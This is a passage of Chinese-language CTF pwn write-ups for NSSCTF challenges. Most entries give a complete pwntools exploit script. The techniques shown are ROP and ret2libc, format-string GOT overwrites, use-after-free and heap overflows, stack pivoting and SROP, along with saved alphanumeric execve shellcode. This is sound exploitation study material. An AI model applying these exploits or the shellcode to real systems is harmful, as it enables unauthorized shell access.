&#x27;Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070tio.recvuntil(&quot;&gt;&gt;&gt;&quot;)io.sendline(&#x27;opt:2\\r\\nmsg:&#x27;+shellcode+&#x27;\\r\\n&#x27;)    #pocio.interactive()\n\nP | [BJDCTF 2020]babyrop2 | str1k3题目说明解题思路#-*- coding:utf-8 -*-from pwn import *from LibcSearcher import *context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;) pwnfile= &#x27;./pwn&#x27; io = process(pwnfile)#io = remote(&#x27;node4.anna.nssctf.cn&#x27;,28352)elf = ELF(pwnfile)rop = ROP(pwnfile)io.recvuntil(&#x27;give u some gift to help u!\\n&#x27;)#gdb.attach(io)#pause()io.sendline(&#x27;%7$p&#x27;)        #格式化字符串泄露canarycanary = int(io.recv(18),16)print(&#x27;canary&#x27;,hex(canary))puts_got = elf.got[&#x27;puts&#x27;]puts_plt = elf.plt[&#x27;puts&#x27;]return_addr = elf.symbols[&#x27;vuln&#x27;]pop_ret = 0x4005f9pop_rdi_ret = 0x400993pop_rsi_r15_ret = 0x400991          #ROPgadgets# 0x0000000000400993 : pop rdi ; ret# 0x0000000000400991 : pop rsi ; pop r15 ; ret# 0x000000000040098d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret# 0x00000000004005f9 : retpayload = b&#x27;a&#x27;*(0x20-0x8) +p64(canary) + b&#x27;a&#x27;*0x8 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(return_addr)#payload = payload.ljust(200, &#x27;a&#x27;)#sub_40063D(v1, 200LL, 10LL);#delimiter = &#x27;Hello,do you want to play a game with me???&#x27;io.recvuntil(&#x27;Pull up your sword and tell me u story!\\n&#x27;)io.sendline(payload)#rop泄露puts地址puts_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))print(&#x27;puts_addr:&#x27;,hex(puts_addr))libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)system_addr = libc_base + libc.dump(&#x27;system&#x27;)bin_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)print(&#x27;libc_base:&#x27;,hex(libc_base))print(&#x27;system_addr:&#x27;,hex(system_addr))print(&#x27;bin_addr:&#x27;,hex(bin_addr))#很奇怪为啥第二次不用再泄露canary# io.recvuntil(&#x27;give u some gift to help u!\\n&#x27;)# io.sendline(&#x27;%7$p&#x27;)# canary = int(io.recv(18),16)# print(&#x27;canary&#x27;,hex(canary))#第二次的rop链payload2 = b&#x27;a&#x27;*(0x20-0x8) +p64(canary) + b&#x27;a&#x27;*0x8 + p64(pop_rdi_ret) + p64(bin_addr) + p64(system_addr)io.recvuntil(&#x27;Pull up your sword and tell me u story!\\n&#x27;)io.sendline(payload2)io.interactive()\n\nP |[NUSTCTF 2022 新生赛]ezPwn | 解题做题人题目说明解题思路from pwn import *context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)pwnfile= &#x27;./ezpwn&#x27;# io = process(pwnfile)io = remote(&#x27;node1.anna.nssctf.cn&#x27;,28938)#elf = ELF(pwnfile)# rop = ROP(pwnfile)# libc =elf.libcpadding = 0x0A+0x08ret = 0x40101afun_addr = 0x401229 #需要返回的漏洞函数payload1 = flat([b&#x27;a&#x27;*padding ,fun_addr])print(payload1)io.sendlineafter(b&#x27;Your name plz:\\n&#x27;,payload1)print(io.recv())print(io.recv())# io.interactive()\n\n[HNCTF 2022 Week1]safe_shellcode题目说明可见字符 shellcode（指能被 ASCII 打印出来的字符）\n解题思路from pwn import *# io = process(“./shellcoder”)io = remote(&#x27;node1.anna.nssctf.cn&#x27;,28519)shellcode=&quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&quot;io.send(shellcode)io.interactive()\n\n存个 shellcode\nx64 下的： Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P1 60Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l 1n0J0h0a070t\nx32 下的： PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6 MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8 MK0AA\n[MoeCTF 2022]ret2text题目说明解题思路\n啥保护都没\n\n有溢出\n\n有后门\nfrom pwn import *context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)io = process(&#x27;./ret2text&#x27;)io = remote(&#x27;node3.anna.nssctf.cn&#x27;, 28240)padding = 0x48back_door = 0x4014BE ret_addr = 0x40101apayload = b&#x27;a&#x27;* 0x48 + p64(ret_addr) + p64(back_door) dem = &quot;please input\\n&quot;# io.sendafter(dem , payload)io.sendline(payload)io.interactive()\n\n[MoeCTF 2021]ezROP题目说明strlen 会被\\x00 截断，别的 ret2libc 就行，libc 版本比较怪，放个官方 wp\n\n解题思路from pwn import *from sgtlibc import *import sgtlibcp = remote(&#x27;node1.anna.nssctf.cn&#x27;,28725)elf = ELF(&#x27;./ezrop&#x27;)p.sendlineafter(&#x27;Input your choice!\\n&#x27;,&#x27;1&#x27;)puts_plt = elf.plt[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]pop_rdi_addr = 0x400c83ret_addr = 0x4006b9encrypt = 0x4009A0payload = b&#x27;a&#x27;*(0x50+8)+p64(pop_rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(encrypt)p.sendlineafter(&#x27;Input your Plaintext to be encrypted\\n&#x27;,payload)puts_addr = u64(p.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))s = sgtlibc.Searcher()s.add_condition(&#x27;puts&#x27;,puts_addr)s.dump(db_index=15) # search libc , if returns multi-result ,default use index-0&#x27;s resultsystem_addr = s.get_address(sgtlibc.s_system)binsh_addr = s.get_address(sgtlibc.s_binsh)puts_addr_ = s.get_address(sgtlibc.s_puts)print(hex(system_addr), hex(binsh_addr), hex(puts_addr_))libc_base = puts_addr - puts_addr_system = libc_base + system_addrbin_sh = libc_base + binsh_addrpayload= b&#x27;a&#x27;*(0x50+8) + p64(ret_addr) +p64(pop_rdi_addr)+p64(bin_sh)+p64(system)+p64(0)p.sendlineafter(&#x27;Input your Plaintext to be encrypted\\n&#x27;,payload)p.interactive()\n\n[HDCTF 2023]Minions题目说明本题的格式化字符串漏洞利用比较简单（指使用 pwntools），就把它放栈题这了\n解题思路\n只开了 NX，看看 main。\n\n再看看 vuln，存在明显的格式化字符串漏洞\n\n顺着字符串找到些好康的\n\n所以我们第一轮先改 main 中的判断条件，把 key 改成 102 的长度就能绕过判断条件，利用第二个 read 跳回 vuln，再次利用格式化字符串漏洞把 printf 劫持为 system，重复上面步骤，在 read 处输入&#x2F;bin&#x2F;sh，再次下一次执行 printf（buff）的时候就可以拿到 shell。\nfrom pwn import *#io = process(&#x27;./minions1&#x27;)io = remote(&#x27;node1.anna.nssctf.cn&#x27;,28731)elf = ELF(&#x27;./minions1&#x27;)context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)key = 0x6010A0printf_got = elf.got[&#x27;printf&#x27;]system_plt = elf.plt[&#x27;system&#x27;]vuln = elf.sym[&#x27;_start&#x27;]payload_fmt1 = fmtstr_payload(6, &#123;key: 0x66&#125;)payload_fmt2 = fmtstr_payload(6, &#123;printf_got: system_plt&#125;)ret2vuln = b&#x27;A&#x27; * (0x30 + 0x08) + p64(vuln)bin_sh = b&#x27;/bin/sh\\x00&#x27;io.recvuntil(b&#x27;name?\\n&#x27;)io.send(payload_fmt1)io.recvuntil(b&#x27;about you\\n&#x27;)io.send(ret2vuln)io.recvuntil(b&#x27;Minions?\\n&#x27;)io.send(b&#x27;g0at&#x27;)io.recvuntil(b&#x27;name?\\n\\n&#x27;)io.send(payload_fmt2)io.recvuntil(b&#x27;about you\\n&#x27;)io.send(ret2vuln)io.recvuntil(b&#x27;Minions?\\n&#x27;)io.send(b&#x27;g0at&#x27;)io.recvuntil(b&#x27;name?\\n\\n&#x27;)io.send(bin_sh)io.interactive()\n\n[NISACTF 2022]UAF查个保护先\n\n放进 IDA 看看，主要函数在下面\nint __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123;  int v3[4]; // [esp+8h] [ebp-10h] BYREF  v3[1] = __readgsdword(0x14u);  setbuf(stdin, 0);  setbuf(stdout, 0);  while ( 1 )  &#123;    while ( 1 )    &#123;      puts(&quot;1.create&quot;);      puts(&quot;2.edit&quot;);      puts(&quot;3.delete&quot;);      puts(&quot;4.show&quot;);      putchar(58);      __isoc99_scanf(&quot;%d&quot;, v3);      if ( v3[0] != 2 )        break;      edit();    &#125;    if ( v3[0] &gt; 2 )    &#123;      if ( v3[0] == 3 )      &#123;        del();      &#125;      else if ( v3[0] == 4 )      &#123;        show();      &#125;      else      &#123;LABEL_13:        puts(&quot;Invalid choice&quot;);      &#125;    &#125;    else    &#123;      if ( v3[0] != 1 )        goto LABEL_13;      create();    &#125;  &#125;&#125;\n\nint create()&#123;  int result; // eax  int v1; // ebx  char *v2; // eax  printf(&quot;you are creating the %d page\\n&quot;, i);  result = i;  if ( i &gt;= 0 )  &#123;    result = i;    if ( i &lt;= 9 )    &#123;      v1 = i;      (&amp;page)[v1] = (char *)malloc(8u);      if ( i )      &#123;        if ( i &lt;= 0 || i &gt; 9 )        &#123;          return puts(&quot;NO PAGE&quot;);        &#125;        else        &#123;          puts(&quot;Good cretation!&quot;);          return ++i;        &#125;      &#125;      else      &#123;        v2 = page;        *(_DWORD *)page = 1868654951;        v2[4] = 0;        *((_DWORD *)page + 1) = echo;        puts(&quot;The init page&quot;);        return ++i;      &#125;    &#125;  &#125;  return result;\n\nunsigned int edit()&#123;  int v1; // [esp+8h] [ebp-10h] BYREF  unsigned int v2; // [esp+Ch] [ebp-Ch]  v2 = __readgsdword(0x14u);  puts(&quot;Input page&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v1);  if ( v1 &lt;= 0 || v1 &gt; i )  &#123;    puts(&quot;NO PAGE&quot;);  &#125;  else  &#123;    puts(&quot;Input your strings&quot;);    __isoc99_scanf(&quot;%s&quot;, (&amp;page)[v1]);  &#125;  return __readgsdword(0x14u) ^ v2;&#125;\n\nunsigned int edit()&#123;  int v1; // [esp+8h] [ebp-10h] BYREF  unsigned int v2; // [esp+Ch] [ebp-Ch]  v2 = __readgsdword(0x14u);  puts(&quot;Input page&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v1);  if ( v1 &lt;= 0 || v1 &gt; i )  &#123;    puts(&quot;NO PAGE&quot;);  &#125;  else  &#123;    puts(&quot;Input your strings&quot;);    __isoc99_scanf(&quot;%s&quot;, (&amp;page)[v1]);  &#125;  return __readgsdword(0x14u) ^ v2;&#125;\n\nunsigned int show()&#123;  int v1; // [esp+8h] [ebp-10h] BYREF  unsigned int v2; // [esp+Ch] [ebp-Ch]  v2 = __readgsdword(0x14u);  puts(&quot;Input page&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v1);  if ( v1 )  &#123;    if ( v1 &lt;= 0 || v1 &gt; i )      puts(&quot;NO PAGE&quot;);    else      echo((&amp;page)[v1]);  &#125;  else  &#123;    (*((void (__cdecl **)(char *))page + 1))(page);  &#125;  return __readgsdword(0x14u) ^ v2;&#125;\n\n\n其中，NICO 是后门函数，给了个 system（）\nedit 函数中，if 判断条件实际上为 &lt;0\n\n\ndel 函数中，free 掉堆块后没有将指针置 0\n\n导致了 UAF 漏洞（Use After Free）\nexp 思路：\n先创建一个 chunk 0\n由于 edit 不能直接编辑 chunk0，因为 实际上 if ( v1 &lt; 0 || v1 &gt; i )\n但是由于系统不会直接回收内存空间，并且 free 后并没有将指针置 0\ncreate 函数创建的 chunk 是不能自定义的，但是我们只要 free 后再申请一次，它就会把之前的 chunk 给我们复用\n但是由于我们不能直接编辑 chunk0，但是 chunk0 现在被 page1 所调用，因此我们只需要使用 edit 写入 page1 sh 并 show_page 即可 getshell\nadd_chunk 之后，可以看到程序申请了一段 0x10 大小的堆\n\nfree 之后这段堆被放到了 tcache 里\n\n再次申请时这段堆就被复用了\n\n但是堆里什么都没有\n\n把 payload 送进堆，拿到 shell\n\n[NISACTF 2022]ezheap\n\n\n申请了两个 chunk，system 在了 0x8048596，所以，我们利用 chunk1 的溢出，溢出到 chunk2 中的 0x8048596，写入&#x2F;bin&#x2F;sh，即可\n\nfrom pwn import*io = remote(&#x27;node3.anna.nssctf.cn&#x27;,28682)#io=process(&quot;./heap&quot;)io.recvuntil(&quot;Input:\\n&quot;)payload=b&#x27;a&#x27;*(0x16+5)+b&#x27;/bin/sh&#x27;io.sendline(payload)io.interactive()\n\n[BJDCTF 2020]YDSneedGirlfriend\n菜单，增删改查，典！\n看看怎么增，\n\n删除，free 之后没有将指针置零，存在 UAF 漏洞\n\nprint_girlfriend 函数会调用 chunk 里的 puts 输出 chunk 里的 name，如果将调用 puts 函数的地方覆写成 backdoor，那么在执行 print_girlfriend 调用 puts 的时候就转去执行 backdoor 了\n\n所以我们先申请两个 chunk，为 chunk0 和 chunk1，然后 free 掉，此时 tcachebins 中的链表为 chunk1-&gt;chunk0\n（有 wp 是 fastbin 内的，估计是版本问题）\n\n现在我们再申请一段 0x10 的 chunk2，这下 chunk2 申请到了 chunk1 的地址，后面申请的用来存名字的 chunk 就申请到了 chunk0 的地址，\n\n现在把 chunk0 中的 puts 的地址改掉，执行 print_girlfriend 的时候就能拿到 shell 了\nfrom pwn import*io=remote(&#x27;node4.anna.nssctf.cn&#x27;,28064)#io=process(&#x27;./girlfriend&#x27;)elf=ELF(&#x27;./girlfriend&#x27;)def add(size,name):    io.sendlineafter(&quot;Your choice :&quot;,&#x27;1&#x27;)    io.sendlineafter(&quot;Her name size is :&quot;,str(size))    io.sendlineafter(&quot;Her name is :&quot;,name)def dele(index):    io.sendlineafter(&quot;Your choice :&quot;,&#x27;2&#x27;)    io.sendlineafter(&quot;Index :&quot;,str(index))def show(index):    io.sendlineafter(&quot;Your choice :&quot;,&#x27;3&#x27;)    io.sendlineafter(&quot;Index :&quot;,str(index))def debug(io):    gdb.attach(io)    pause()#debug(io)backdoor=0x400b9cadd(0x20,&#x27;aaaa&#x27;)add(0x20,&#x27;bbbb&#x27;)dele(0)dele(1)add(0x10,p64(backdoor))show(0)io.interactive()\n\n[HNCTF 2022 WEEK4]ezheap\n保护全开，急！但是增删改查，典！\n\ndelete 无 UAF\nadd 会在用户申请的堆块之前申请一个大小为 0x20 的堆块，并会在用户申请的自定义大小的堆块的 Chunk Header 的 Prev_Size 位存放 puts 函数的地址。\n\nshow 将 Prev_Size 的地址取出，作为函数调用，然后取出 fd 指针，作为参数。\n\nedit 存在堆溢出\n\n原理是通过修改 puts 函数的参数，原本是打印某个堆块的内容，更改为我们创建的堆块地址的 Header，即可打印出我们的 puts 地址。\nfrom struct import packfrom ctypes import *from LibcSearcher import *from pwn import *def debug():    gdb.attach(p)    pause()def get_addr():    return u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)#p = process(&#x27;./ezheap&#x27;)p = remote(&#x27;node1.anna.nssctf.cn&#x27;, 28355)elf = ELF(&#x27;./ezheap&#x27;)libc = ELF(&#x27;./libc-2.23.so&#x27;)def add(idx, size, name = b&#x27;a&#x27;, data = b&#x27;a&#x27;):    p.sendlineafter(b&#x27;Choice: \\n&#x27;, b&#x27;1&#x27;)    p.sendlineafter(b&#x27;idx:\\n&#x27;, str(idx))    p.sendlineafter(b&#x27;Size:\\n&#x27;, str(size))    p.sendafter(b&#x27;Name: \\n&#x27;, name)    p.sendafter(b&#x27;Content:\\n&#x27;, data)def free(idx):    p.sendlineafter(b&#x27;Choice: \\n&#x27;, b&#x27;2&#x27;)    p.sendlineafter(b&#x27;idx:\\n&#x27;, str(idx))def show(idx):    p.sendlineafter(b&#x27;Choice: \\n&#x27;, b&#x27;3&#x27;)    p.sendlineafter(b&#x27;idx:\\n&#x27;, str(idx))def edit(idx, size, data):    p.sendlineafter(b&#x27;Choice: \\n&#x27;, b&#x27;4&#x27;)    p.sendlineafter(b&#x27;idx:\\n&#x27;, str(idx))    p.sendlineafter(b&#x27;Size:\\n&#x27;, str(size))    p.send(data)# leak libc_baseadd(0, 0x10)add(1, 0x10)edit(0, 0x31, p64(0)*3 + p64(0x31) + p64(0)*2 + p8(0x30))show(1)libc_base = get_addr() - libc.sym[&#x27;puts&#x27;]# leak heap_baseedit(0, 0x31, p64(0)*3 + p64(0x31) + p64(0)*2 + p8(0x20))show(1)p.recvuntil(b&#x27;\\n&#x27;)heap_base = u64(p.recvuntil(b&#x27;\\x0a&#x27;)[:-1].ljust(8, b&#x27;\\x00&#x27;)) - 0x40# pwnsystem = libc_base + libc.sym[&#x27;system&#x27;]edit(0, 0x48, b&#x27;/bin/sh\\x00&#x27; + p64(0)*2 + p64(0x31) + p64(0)*2 + p64(heap_base + 0x40) + p64(0) + p64(system))show(1)p.interactive()print(&#x27; heap_base -&gt; &#x27;, hex(heap_base))print(&#x27; libc_base -&gt; &#x27;, hex(libc_base))#debug()\n\n\nP | [CISCN 2022 初赛]login_normal | 解题做题人题目说明解题思路看 main 函数，read 后执行 sub_FFD\n\n跟进 sub_FFD\nunsigned __int64 __fastcall sub_FFD(_BYTE *a1)&#123;  char *sa; // [rsp+8h] [rbp-48h]  char *sb; // [rsp+8h] [rbp-48h]  char *sc; // [rsp+8h] [rbp-48h]  char *sd; // [rsp+8h] [rbp-48h]  char v7; // [rsp+17h] [rbp-39h]  int v8; // [rsp+1Ch] [rbp-34h]  int v9; // [rsp+2Ch] [rbp-24h]  void *dest; // [rsp+30h] [rbp-20h]  char *s1; // [rsp+38h] [rbp-18h]  char *nptr; // [rsp+40h] [rbp-10h]  unsigned __int64 v13; // [rsp+48h] [rbp-8h]  v13 = __readfsqword(0x28u);  memset(qword_202040, 0, sizeof(qword_202040));  v8 = 0;  v7 = 0;  dest = 0LL;  while ( !*a1 || *a1 != 10 &amp;&amp; (*a1 != 13 || a1[1] != 10) )// 关于a[0]和a[1]的判定关系  &#123;    if ( v8 &lt;= 5 )      qword_202040[2 * v8] = a1;                // 处理的位分别是0，8，16，24，32    sb = strchr(a1, 58);                        // 找到字符&#x27;:&#x27;位置    if ( !sb )    &#123;      puts(&quot;error.&quot;);      exit(1);    &#125;    *sb = 0;                                    // 将找到&#x27;:&#x27;的位置数值变为0    for ( sc = sb + 1; *sc &amp;&amp; (*sc == &#x27; &#x27; || *sc == &#x27;\\r&#x27; || *sc == &#x27;\\n&#x27; || *sc == &#x27;\\t&#x27;); ++sc )// sc=sb的下一位，sc满足在范围内且等于指定字符      *sc = 0;                                  // 当前字符置0    if ( !*sc )                 &#123;      puts(&quot;abort.&quot;);      exit(2);    &#125;    if ( v8 &lt;= 5 )      qword_202040[2 * v8 + 1] = sc;            // (0,8,16,24,32)+1出来的值    sd = strchr(sc, &#x27;\\n&#x27;);                    if ( !sd )    &#123;      puts(&quot;error.&quot;);      exit(3);    &#125;    *sd = 0;                                    // 置零    a1 = sd + 1;                                // 首位置到sd的下一位    if ( *a1 == &#x27;\\r&#x27; )                          // 如果当前位是\\r下一位置0      *a1++ = 0;    s1 = (char *)qword_202040[2 * v8];          // 0,8,16,24,32    nptr = (char *)qword_202040[2 * v8 + 1];      if ( !strcasecmp(s1, &quot;opt&quot;) )             &#123;      if ( v7 )      &#123;                                         // 第一次opt退出        puts(&quot;error.&quot;);        exit(5);      &#125;      v7 = atoi(nptr);    &#125;    else    &#123;      if ( strcasecmp(s1, &quot;msg&quot;) )              // 是否是msg      &#123;        puts(&quot;error.&quot;);        exit(4);      &#125;      if ( strlen(nptr) &lt;= 1 )      &#123;        puts(&quot;error.&quot;);        exit(5);      &#125;      v9 = strlen(nptr) - 1;                   if ( dest )      &#123;        puts(&quot;error.&quot;);        exit(5);      &#125;      dest = calloc(v9 + 8, 1uLL);      if ( v9 &lt;= 0 )      &#123;        puts(&quot;error.&quot;);        exit(5);      &#125;      memcpy(dest, nptr, v9);                     &#125;    ++v8;  &#125;  *a1 = 0;  sa = a1 + 1;                                if ( *sa == &#x27;\\n&#x27; )                            // 如果是换行符就赋值0    *sa = 0;  switch ( v7 )                             &#123;    case 2:      sub_DA8((const char *)dest);      break;    case 3:      sub_EFE((const char *)dest);      break;    case 1:      sub_CBD((const char *)dest);      break;    default:      puts(&quot;error.&quot;);      exit(6);  &#125;  return __readfsqword(0x28u) ^ v13;&#125;\n\n由上述可知，要进行两次校验，在连接之后就需要先写通过校验才可以进行后续操作，即 &#39;opt:1\\r\\nmsg:ro0t\\r\\n 和 opt:2\\r\\nmsg:，且最终结尾必须是 \\r\\n\n绕过后到达 sub_DA8\nunsigned __int64 __fastcall sub_DA8(const char *a1)&#123;  unsigned int v1; // eax  size_t v2; // rax  int i; // [rsp+14h] [rbp-2Ch]  void *dest; // [rsp+18h] [rbp-28h]  unsigned __int64 v6; // [rsp+28h] [rbp-18h]  v6 = __readfsqword(0x28u);  for ( i = 0; i &lt; strlen(a1); ++i )  &#123;    if ( !isprint(a1[i]) &amp;&amp; a1[i] != 10 )    &#123;      puts(&quot;oh!&quot;);      exit(-1);    &#125;  &#125;  if ( unk_202028 != 1 )  &#123;    puts(&quot;oh!&quot;);    exit(-1);  &#125;  if ( unk_202024 )  &#123;    v1 = getpagesize();    dest = (void *)(int)mmap((char *)&amp;loc_FFE + 2, v1, 7, 34, 0, 0LL);    v2 = strlen(a1);    memcpy(dest, a1, v2);    ((void (*)(void))dest)();    //shellcode利用转换执行  &#125;  else  &#123;    puts(a1);  &#125;  return __readfsqword(0x28u) ^ v6;&#125;\n\npush edxpush 0x36363630push esppop ecxxor dword ptr ds:[ecx],esixor esi,dword ptr ds:[ecx]pop eaxpush 0x33333333xor dword ptr ds:[ecx],esiimul esi,dword ptr ds:[ecx],0x33pop eaxpush 0x69push esixor dword ptr ds:[ecx],esidec eaxarpl word ptr ds:[ecx],sipop edxpop eaxpop ecxxor word ptr ds:[ecx+esi*2+0x49],dxdec eaxcmp word ptr ds:[ebx+0x44],bpjno short tested.004780A6xor byte ptr ds:[edx],dhinc espjno short tested.004780ACxor byte ptr ds:[ecx+esi+0x48],aljnz short tested.0047808Ddec ebpxor al,byte ptr ds:[edi+0x30]pop edxxor ch,byte ptr ds:[edi+0x34]dec eaxxor byte ptr ss:[ebp+0x30],dhpush eaxxor dword ptr ds:[esi],esixor byte ptr ds:[edx+0x30],blaaadec edixor byte ptr ds:[edx+0x30],blinc ebxxor dword ptr ds:[eax],esixor byte ptr ds:[ecx+0x35],bhdec edixor eax,dword ptr ds:[edi+0x30]xor dh,byte ptr ds:[eax]inc edxxor ch,byte ptr ds:[esi+0x30]xor byte ptr ss:[esi+0x34],cljno short tested.004780B8outs dx,byte ptr es:[edi]xor dh,byte ptr ds:[eax+esi+0x42]xor byte ptr ds:[eax],dhxor byte ptr ds:[ecx],dhxor byte ptr ds:[ecx],dhxor byte ptr ds:[eax+0x33],clpush ebxxor bh,byte ptr ds:[ecx+0x30]pop ecxxor byte ptr ds:[edi+0x30],clouts dx,byte ptr es:[edi]xor byte ptr ds:[edx+0x30],bhxor dword ptr ds:[ebx],esixor al,0x30xor al,byte ptr fs:[esi+0x34]jns short tested.004780E4push eaxxor dword ptr ds:[ecx],esixor eax,0x306E316Cdec edxxor byte ptr ds:[eax+0x30],chpopadxor byte ptr ds:[edi],dhxor byte ptr ds:[eax+eax],dhadd bh,bhadd byte ptr ds:[eax],aladd bh,bhpop eaxinc ecx\n\nshellcode:&#x2F;bin&#x2F;sh\n#!/usr/bin/env python#coding=utf-8from pwn import*io = remote(ip,port)libc = ELF(&#x27;./libc-2.23.so&#x27;)io.recvuntil(&quot;&gt;&gt;&gt;&quot;)io.sendline(&#x27;opt:1\\r\\nmsg:ro0t\\r\\n&#x27;)    ##绕过1shellcode = &#x27;Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;io.recvuntil(&quot;&gt;&gt;&gt;&quot;)io.sendline(&#x27;opt:2\\r\\nmsg:&#x27;+shellcode+&#x27;\\r\\n&#x27;)    #pocio.interactive()\n\n[CISCN 2019 东南]PWN2题目说明栈迁移\n解题思路\n\nread 读 0x30，但 s 已经 0x28，长度不够，考虑栈迁移。找一下 gadget\n\n接下来我们尝试把&#x2F;bin&#x2F;sh 写入 s，找一下 s 的地址\n\n在 vul 函数上输点奇怪的东西，然后找一下他\n\n\nebp 就变成奇怪的形状了（大雾），算一下 ebp 的偏移\n\nPadding = b&#x27;A&#x27; * 0x27 + b&#x27;C&#x27;io.send(Padding)io.recvuntil(b&#x27;C&#x27;)EBP = u32(io.recv(4))s = EBP - 0x38\n\n首先是接收 EBP 地址的 Payload。\nPrintf 会在字符串结尾加上一个’\\x00’。我们手动填满 buf 即可让 printf 打印出 EBP 的地址。\nPayload = (b&#x27;A&#x27; * 0x04) + p32(system) + p32(vul) + p32(s + 0x10) + b&#x27;/bin/sh&#x27;Payload = Payload.ljust(0x28,b&#x27;\\x00&#x27;)Payload += p32(s) + p32(leave_ret)\n\n(b’A’ * 0x04) 栈对齐\nsystem 调用 system 函数\nvul 返回地址，随便填 防止程序崩溃\ns + 0x10 为什么是 0x10，32 位中地址长度是 0x04，而此处 Payload 从第一个开始算到第四个,4x4 &#x3D; 16 &#x3D; 0x10。\nb’&#x2F;bin&#x2F;sh’ 将 &#x2F;bin&#x2F;sh 字符串送入栈中\nljust 在 payload 的末尾填充空字节，填充的大小为 0x28-len(Payload)\ns 指向本段 ROP 链的地址，覆盖了 ebp\nleave_ret 将 eip 覆盖为 ebp，也就是刚才的 s，执行 ROP 链\nfrom pwn import * context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;) io = remote(&#x27;node3.anna.nssctf.cn&#x27;,28243)#io = process(&#x27;./CISCN_2019_PWN2&#x27;)elf = ELF(&#x27;./pwn2&#x27;) Padding = b&#x27;A&#x27; * 0x27 + b&#x27;C&#x27;system = elf.plt[&#x27;system&#x27;]vul = elf.sym[&#x27;vul&#x27;]leave_ret = 0x80484b8 io.send(Padding)io.recvuntil(b&#x27;C&#x27;)EBP = u32(io.recv(4))s = EBP - 0x38 Payload = (b&#x27;A&#x27; * 0x04) + p32(system) + p32(vul) + p32(s + 0x10) + b&#x27;/bin/sh&#x27;Payload = Payload.ljust(0x28,b&#x27;\\x00&#x27;)Payload += p32(s) + p32(leave_ret) io.sendline(Payload)io.interactive()\n\n[CISCN 2019 华南]PWN3题目说明srop 不会，贴个 exp 先\n解题思路from pwn import *context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)# io = process(&quot;./hnpwn3&quot;)io = remote(&quot;node1.anna.nssctf.cn&quot;,28434)elf = ELF(&quot;./hnpwn3&quot;)syscall = 0x400517gadget = 0x4004DAvuln = 0x4004ED# gdb.attach(io,&quot;b *main&quot;)io.send(b&quot;a&quot;*0x10+p64(vuln))io.recv(0x20)# print()stack = u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;)) -0x118print(&quot;stack -&gt; &quot; + hex(stack))frame = SigreturnFrame()frame.rax = 59frame.rdi = stackframe.rip = syscallframe.rsi = 0payload = b&quot;/bin/sh\\x00&quot;*0x2 + p64(gadget) + p64(syscall) + bytes(frame)io.send(payload)io.interactive()\n\n[CISCN 2019 东北]PWN2题目说明strlen+ret2libc\n解题思路关键在这里\n\nstrlen 函数会被\\x00 截断，所以截断后再接上 payload 即可造成溢出\n\n确认一下没有 canary，后面 ret2libc 就行\n\nfrom pwn import *import sgtlibccontext.log_level=&#x27;debug&#x27;p=remote(&#x27;node1.anna.nssctf.cn&#x27;,28462)elf=ELF(&#x27;./[CISCN 2019东北]PWN2&#x27;)p.recvuntil(b&#x27;choice!&#x27;)p.sendline(str(1))puts_got=elf.got[&#x27;puts&#x27;]puts_plt=elf.plt[&#x27;puts&#x27;]ret=0x00000000004006b9pop_rdi=0x0000000000400c83main=elf.symbols[&#x27;main&#x27;]payload=b&#x27;\\x00&#x27;payload+=b&#x27;a&#x27;*0x57payload+=p64(pop_rdi)payload+=p64(puts_got)payload+=p64(puts_plt)payload+=p64(main)p.recvuntil(&#x27;be encrypted&#x27;)p.sendline(payload)puts_addr=u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))print(hex(puts_addr))log.info(&quot;puts addr is :%x&quot;%puts_addr)s = sgtlibc.Searcher()s.add_condition(&#x27;puts&#x27;,puts_addr)s.dump(db_index=2) # search libc , if returns multi-result ,default use index-0&#x27;s 